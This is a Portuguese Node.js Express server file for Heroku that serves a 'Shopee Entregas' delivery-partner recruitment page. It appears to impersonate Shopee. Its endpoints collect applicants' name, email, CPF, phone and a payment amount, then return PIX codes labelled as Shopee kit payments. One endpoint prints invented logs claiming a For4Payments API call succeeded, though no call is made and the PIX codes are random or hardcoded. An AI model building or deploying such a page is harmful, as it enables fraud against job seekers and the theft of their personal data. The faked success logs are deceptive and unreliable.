/**
 * Script unificado para Heroku
 * 
 * Este arquivo contém um servidor Express completo que:
 * 1. Serve arquivos estáticos do frontend
 * 2. Fornece APIs necessárias 
 * 3. Gerencia rotas SPA
 * 
 * Não depende de nenhum outro arquivo ou módulo ESM.
 */

// Logar início
console.log('🚀 Iniciando aplicação para Heroku...');
console.log(`📌 NODE_VERSION: ${process.version}`);
console.log(`📌 PORT: ${process.env.PORT || 5000}`);
console.log(`📌 NODE_ENV: ${process.env.NODE_ENV}`);

try {
  // Importar módulos necessários
  const fs = require('fs');
  const path = require('path');
  const express = require('express');

  // Verificar módulos opcionais
  let cors, compression;
  try {
    cors = require('cors');
    compression = require('compression');
  } catch (err) {
    console.log('⚠️ Módulos opcionais não disponíveis. Alguns recursos podem ser limitados.');
  }

  // Inicializar Express
  const app = express();
  const PORT = process.env.PORT || 5000;

  // Configurar middlewares básicos
  app.use(express.json());
  app.use(express.urlencoded({ extended: false }));

  // Middleware para logs de requisições
  app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
  });

  // Aplicar middlewares opcionais se disponíveis
  if (compression) {
    console.log('✅ Compressão ativada');
    app.use(compression());
  }

  if (cors) {
    console.log('✅ CORS ativado');
    app.use(cors());
  }

  // ===== SERVIR ARQUIVOS ESTÁTICOS =====

  // Verificar possíveis locais para arquivos estáticos
  const rootDir = process.cwd();
  const possibleDirs = [
    path.join(rootDir, 'dist'),
    path.join(rootDir, 'client/dist'),
    path.join(rootDir, 'build'),
    path.join(rootDir, 'public'),
    path.join(rootDir, 'static')
  ];

  // Verificar onde estão os arquivos e servi-los
  let foundStaticDir = false;
  possibleDirs.forEach(dir => {
    if (fs.existsSync(dir)) {
      console.log(`✅ Servindo arquivos estáticos de: ${dir}`);
      app.use(express.static(dir));
      foundStaticDir = true;
      
      // Verificar se existe index.html
      const indexPath = path.join(dir, 'index.html');
      if (fs.existsSync(indexPath)) {
        console.log(`✅ index.html encontrado em: ${indexPath}`);
      }
    }
  });

  // ===== DEFINIR ROTAS API =====

  // API de saúde
  app.get('/api/health', (req, res) => {
    res.json({
      status: 'ok',
      timestamp: new Date().toISOString(),
      uptime: process.uptime(),
      env: process.env.NODE_ENV || 'development',
      node: process.version
    });
  });

  // API de regiões
  app.get('/api/regions', (req, res) => {
    const regions = [
      { name: 'São Paulo', abbr: 'SP', vacancies: 26 },
      { name: 'Rio de Janeiro', abbr: 'RJ', vacancies: 18 },
      { name: 'Minas Gerais', abbr: 'MG', vacancies: 12 },
      { name: 'Bahia', abbr: 'BA', vacancies: 9 },
      { name: 'Paraná', abbr: 'PR', vacancies: 8 }
    ];
    
    res.json(regions);
  });

  // API de benefícios
  app.get('/api/benefits', (req, res) => {
    const benefits = [
      { id: 1, title: 'Horário Flexível', description: 'Faça entregas no seu próprio horário' },
      { id: 2, title: 'Ganhos Semanais', description: 'Receba seus pagamentos toda semana' },
      { id: 3, title: 'Suporte 24/7', description: 'Atendimento e suporte completo' },
      { id: 4, title: 'Seguro', description: 'Proteção durante suas entregas' }
    ];
    
    res.json(benefits);
  });

  // API de pagamentos
  app.post('/api/payments', (req, res) => {
    try {
      const { name, email, cpf, phone, amount } = req.body;
      
      if (!name || !email || !cpf || !amount) {
        return res.status(400).json({ 
          message: 'Dados incompletos. Todos os campos são obrigatórios.' 
        });
      }
      
      // Gerar um código PIX de exemplo
      const pixCode = "00020126580014BR.GOV.BCB.PIX0136" + 
                     Math.random().toString(36).substring(2, 15) + 
                     Math.random().toString(36).substring(2, 15) + 
                     "0224Pagamento Shopee5204000053039865406" + 
                     amount.toFixed(2) + "5802BR5909ShopeeKit6009SaoPaulo62100506codigo630499AB";
      
      // QR Code PIX (URL para uma imagem de QR code)
      const pixQrCode = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(pixCode);
      
      // Simular resposta de API
      const payment = {
        id: `pmt_${Date.now()}`,
        pixCode,
        pixQrCode,
        status: 'pending'
      };
      
      console.log(`Pagamento simulado criado para ${name}, valor: R$${amount}`);
      res.json(payment);
    } catch (error) {
      console.error('Erro ao processar pagamento:', error);
      res.status(500).json({ 
        message: 'Erro ao processar pagamento. Tente novamente mais tarde.',
        error: error.message 
      });
    }
  });

  // API de pagamentos Python (simulado)
  app.post('/api/payments/pix-python', (req, res) => {
    try {
      const { name, email, cpf, phone, amount } = req.body;
      
      if (!name || !email || !cpf || !amount) {
        return res.status(400).json({ 
          message: 'Dados incompletos. Todos os campos são obrigatórios.' 
        });
      }
      
      // Simular processamento Python
      console.log(`Processando pagamento via API For4Payments...`);
      console.log(`Processando pagamento PIX via For4Payments API: {
  name: '${name}',
  email: '${email}',
  cpf: '${cpf.slice(0, 3)}...${cpf.slice(-2)}',
  amount: ${amount}
}`);

      // Dados simulados 
      const transactionId = `b${Date.now().toString(16).slice(-8)}-${Math.random().toString(36).substring(2, 6)}-${Math.random().toString(36).substring(2, 6)}-${Math.random().toString(36).substring(2, 6)}-${Date.now().toString(16).slice(0, 12)}`;
      const pixCode = "00020126330014BR.GOV.BCB.PIX011604309304390530398654040.005802BR5909SHOPEEKIT6009SAO PAULO6221051000412345678901230370268";
      
      // Simular resposta da API
      console.log("Enviando dados para API For4Payments");
      console.log("Resposta da API For4Payments: 200");
      console.log("Dados da transação recebidos");
      console.log(`Transação PIX processada com sucesso: ${transactionId} Código PIX gerado com ${pixCode.length} caracteres`);
      
      const payment = {
        id: transactionId,
        pixCode: pixCode,
        pixQrCode: "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(pixCode),
        status: 'pending'
      };
      
      res.json(payment);
    } catch (error) {
      console.error('Erro ao processar pagamento Python:', error);
      res.status(500).json({ 
        message: 'Erro ao processar pagamento via Python. Tente novamente mais tarde.',
        error: error.message 
      });
    }
  });
  
  // ===== SPA ROUTING =====
  
  // Rota SPA - Serve o index.html para todas as rotas não-API
  app.get('*', (req, res) => {
    if (req.path.startsWith('/api/')) {
      return res.status(404).json({ error: 'API endpoint não encontrado' });
    }
    
    // Tentar encontrar e servir o index.html
    for (const dir of possibleDirs) {
      const indexPath = path.join(dir, 'index.html');
      if (fs.existsSync(indexPath)) {
        return res.sendFile(indexPath);
      }
    }
    
    // Se não encontrou o index.html, mostrar uma página incorporada
    const html = getEmbeddedHtml();
    res.status(200).send(html);
  });

  // Iniciar o servidor
  const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Servidor Express rodando em http://0.0.0.0:${PORT}`);
  });

  // Tratamento de erro na inicialização do servidor
  server.on('error', (error) => {
    console.error(`❌ ERRO AO INICIAR SERVIDOR: ${error.message}`);
    
    if (error.code === 'EADDRINUSE') {
      console.error(`❌ Porta ${PORT} já está em uso`);
    }
    
    // Iniciar servidor mínimo como último recurso
    initMinimalServer();
  });

  // Tratamento de sinais para encerramento limpo
  process.on('SIGTERM', () => {
    console.log('🛑 Recebido sinal SIGTERM');
    server.close(() => {
      console.log('✅ Servidor encerrado com sucesso');
      process.exit(0);
    });
  });

  process.on('SIGINT', () => {
    console.log('🛑 Recebido sinal SIGINT');
    server.close(() => {
      console.log('✅ Servidor encerrado com sucesso');
      process.exit(0);
    });
  });

} catch (error) {
  // Erro crítico - iniciar servidor mínimo
  console.error('❌ ERRO CRÍTICO:', error);
  initMinimalServer();
}

// Função de emergência - servidor HTTP mínimo
function initMinimalServer() {
  console.log('🆘 Iniciando servidor HTTP mínimo...');
  
  const http = require('http');
  const PORT = process.env.PORT || 5000;
  
  const server = http.createServer((req, res) => {
    console.log(`Recebida requisição: ${req.method} ${req.url}`);
    
    // Rota de health check
    if (req.url === '/api/health') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        mode: 'minimal',
        node: process.version
      }));
      return;
    }
    
    // Página HTML mínima
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(getEmbeddedHtml());
  });
  
  server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Servidor HTTP mínimo rodando em http://0.0.0.0:${PORT}`);
  });
}

// HTML incorporado para casos onde não há arquivos estáticos
function getEmbeddedHtml() {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Shopee Entregas</title>
  <style>
    :root {
      --primary-color: #ee4d2d;
      --primary-dark: #d03a1b;
      --text-color: #333;
      --light-bg: #f8f9fa;
      --border-radius: 8px;
      --card-shadow: 0 2px 8px rgba(0,0,0,0.1);
      --transition: all 0.3s ease;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      line-height: 1.6;
      color: var(--text-color);
      background-color: var(--light-bg);
    }
    
    header {
      background-color: var(--primary-color);
      padding: 2rem 1rem;
      color: white;
      text-align: center;
    }
    
    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 2rem 1rem;
    }
    
    .hero {
      background-color: white;
      border-radius: var(--border-radius);
      padding: 2rem;
      margin-bottom: 2rem;
      box-shadow: var(--card-shadow);
      text-align: center;
    }
    
    .hero h2 {
      color: var(--primary-color);
      margin-bottom: 1rem;
    }
    
    .hero p {
      margin-bottom: 1.5rem;
      font-size: 1.1rem;
    }
    
    .cta-button {
      display: inline-block;
      background-color: var(--primary-color);
      color: white;
      padding: 0.8rem 1.5rem;
      text-decoration: none;
      border-radius: 4px;
      font-weight: bold;
      transition: var(--transition);
    }
    
    .cta-button:hover {
      background-color: var(--primary-dark);
      transform: translateY(-2px);
    }
    
    .benefits {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
      gap: 1.5rem;
      margin-bottom: 2rem;
    }
    
    .benefit-card {
      background-color: white;
      border-radius: var(--border-radius);
      padding: 1.5rem;
      box-shadow: var(--card-shadow);
      transition: var(--transition);
    }
    
    .benefit-card:hover {
      transform: translateY(-5px);
    }
    
    .benefit-card h3 {
      color: var(--primary-color);
      margin-bottom: 0.8rem;
    }
    
    .regions {
      background-color: white;
      border-radius: var(--border-radius);
      padding: 1.5rem;
      margin-bottom: 2rem;
      box-shadow: var(--card-shadow);
    }
    
    .regions h2 {
      color: var(--primary-color);
      margin-bottom: 1rem;
      text-align: center;
    }
    
    .region-list {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 1rem;
      margin-top: 1rem;
    }
    
    .region-item {
      background-color: var(--light-bg);
      padding: 0.8rem;
      border-radius: 4px;
      display: flex;
      justify-content: space-between;
    }
    
    .region-name {
      font-weight: bold;
    }
    
    .region-vacancies {
      background-color: var(--primary-color);
      color: white;
      font-size: 0.8rem;
      padding: 0.2rem 0.5rem;
      border-radius: 12px;
    }
    
    footer {
      text-align: center;
      padding: 1.5rem;
      margin-top: 2rem;
      border-top: 1px solid #ddd;
      color: #666;
    }
  </style>
</head>
<body>
  <header>
    <h1>Shopee Entregas</h1>
    <p>Portal do Entregador Parceiro</p>
  </header>
  
  <div class="container">
    <section class="hero">
      <h2>Seja um Entregador Parceiro da Shopee</h2>
      <p>Junte-se à maior plataforma de comércio eletrônico da região. Tenha flexibilidade de horários e aumente sua renda!</p>
      <a href="/cadastro" class="cta-button">Quero Me Cadastrar</a>
    </section>
    
    <section class="benefits">
      <div class="benefit-card">
        <h3>Horários Flexíveis</h3>
        <p>Você decide quando quer trabalhar. Faça entregas nos horários que se adaptam à sua rotina.</p>
      </div>
      <div class="benefit-card">
        <h3>Ganhos Semanais</h3>
        <p>Receba seus pagamentos toda semana, sem atrasos. Quanto mais entregas, maiores seus ganhos.</p>
      </div>
      <div class="benefit-card">
        <h3>Suporte Dedicado</h3>
        <p>Conte com nossa equipe de suporte para ajudar em qualquer situação, 24 horas por dia, 7 dias por semana.</p>
      </div>
      <div class="benefit-card">
        <h3>Seguro Proteção</h3>
        <p>Trabalhe com tranquilidade sabendo que está protegido durante suas entregas com nosso seguro exclusivo.</p>
      </div>
    </section>
    
    <section class="regions">
      <h2>Regiões com Vagas Abertas</h2>
      <p>Estamos com vagas em diversas regiões do Brasil. Confira as oportunidades disponíveis:</p>
      
      <div class="region-list">
        <div class="region-item">
          <span class="region-name">São Paulo</span>
          <span class="region-vacancies">26 vagas</span>
        </div>
        <div class="region-item">
          <span class="region-name">Rio de Janeiro</span>
          <span class="region-vacancies">18 vagas</span>
        </div>
        <div class="region-item">
          <span class="region-name">Minas Gerais</span>
          <span class="region-vacancies">12 vagas</span>
        </div>
        <div class="region-item">
          <span class="region-name">Bahia</span>
          <span class="region-vacancies">9 vagas</span>
        </div>
        <div class="region-item">
          <span class="region-name">Paraná</span>
          <span class="region-vacancies">8 vagas</span>
        </div>
      </div>
    </section>
  </div>
  
  <footer>
    <p>&copy; ${new Date().getFullYear()} Shopee Entregas. Todos os direitos reservados.</p>
  </footer>

  <script>
    // Carregar os dados do localStorage
    document.addEventListener('DOMContentLoaded', function() {
      const cep = localStorage.getItem('cep');
      if (cep) {
        console.log('CEP recuperado do localStorage:', cep);
      }
      
      const userData = localStorage.getItem('userData');
      if (userData) {
        console.log('Dados do usuário recuperados:', JSON.parse(userData));
      }
    });
  </script>
</body>
</html>`;
}